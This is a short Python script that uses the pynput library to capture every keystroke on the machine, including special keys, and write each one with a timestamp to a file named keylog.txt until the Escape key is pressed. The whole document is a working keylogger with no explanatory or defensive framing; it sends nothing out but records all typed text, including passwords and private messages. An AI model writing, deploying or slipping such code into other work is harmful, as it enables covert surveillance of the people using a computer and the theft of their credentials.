from pynput.keyboard import Key, Listener
import logging
from datetime import datetime

# Setup logging configuration
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to format and log keystrokes
def on_press(key):
    try:
        k = key.char
        logging.info(f'Key pressed: {k}')
    except AttributeError:
        if key == Key.space:
            logging.info('Key pressed: [SPACE]')
        elif key == Key.enter:
            logging.info('Key pressed: [ENTER]')
        elif key == Key.esc:
            logging.info('Key pressed: [ESC]')
        else:
            logging.info(f'Special key pressed: {key}')

# Function to handle key release events (Optional)
def on_release(key):
    if key == Key.esc:
        return False

# Log start of a new session
logging.info("\n=== New Session Started ===\n")

# Start listening for keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Log end of session (if required)
logging.info("\n=== Session Ended ===\n")
